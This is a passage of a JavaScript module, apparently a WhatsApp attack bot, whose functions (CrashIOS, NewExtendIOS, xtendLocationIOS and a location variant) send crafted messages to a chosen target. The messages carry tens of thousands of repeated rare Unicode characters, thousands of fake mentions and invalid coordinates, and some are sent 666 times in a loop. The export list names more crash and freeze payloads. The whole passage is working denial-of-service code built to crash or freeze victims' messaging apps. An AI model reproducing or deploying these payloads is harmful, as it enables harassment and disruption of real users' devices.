        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(150),
          address: "ꦽ".repeat(100),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }};

  const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: target
  });
 }
}

async function CrashIOS(prim, target) {
  await prim.relayMessage("status@broadcast", {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉፮▾፮▾፮▾ ༑̴⟆",
        url: "https://t.me/Handsome_primis_killer_kent",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "𑇂𑆵𑆴𑆿".repeat(60000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    },
    {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target } }
              ]
            }
          ]
        }
      ]
    }
  );
}
        
async function NewExtendIOS(target) {
    for (let i = 0; i < 666; i++) {
        const extendedTextMessage = {
            text: `િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉ 🦠፮▾ ༑̴⟆ \n\n 🦠 creditos : t.me/Handsome_primis_killer_kent ` + "𑇂𑆵𑆴𑆿".repeat(25000),
            matchedText: "https://t.me/Handsome_primis_killer_kent",
            description: "િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉፮▾፮▾ ༑̴⟆" + "𑇂𑆵𑆴𑆿".repeat(150),
            title: "િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉፮▾፮▾፮▾̽፮▾ ༑̴⟆" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT",
            contextInfo: {
                quotedAd: {
                    advertiserName: "x",
                    mediaType: "IMAGE",
                    jpegThumbnail: "",
                    caption: "x"
                },
                placeholderKey: {
                    remoteJid: "0@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                }
            }
        };

        const msg = generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: { extendedTextMessage }
            }
        }, {});

        await prim.relayMessage(target, { groupStatusMessageV2: { message: msg.message } },
            { participant: { jid: target } });
    }
};

async function xtendLocationIOS(target) {
    for (let i = 0; i < 666; i++) {
        const locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            previewType: "NONE",
            jpegThumbnail: "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",
            name: "િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉፮▾፮▾̽፮▾ ༑̴⟆" + "𑇂𑆵𑆴𑆿".repeat(15000),
            address: "𖣂 ᳟༑ᜌ ̬  .....   ͠⤻𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 ( 𖣂 ) 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ⃜    ⃟༑" + "𑇂𑆵𑆴𑆿".repeat(5000),
            url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
            contextInfo: {
                quotedAd: {
                    advertiserName: "x",
                    mediaType: "IMAGE",
                    jpegThumbnail: "",
                    caption: "x"
                },
                placeholderKey: {
                    remoteJid: "0@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                }
            }
        };

        const msg = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: locationMessage }
        }, {});

        await prim.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, 
        { participant: { jid: target } });
    }
};

module.exports = { ForceCloseOverButton, OverParams, InteractiveUI, invico1, invico2, FlowCrash, BlankUiNew, gsglx, InVisibleChart, sjlglx, InVisibleF, InVisibleRespone, blank, FrezeXblank, PhotoDelay, bokep, LocX, CrashIOS, NewExtendIOS, xtendLocationIOS }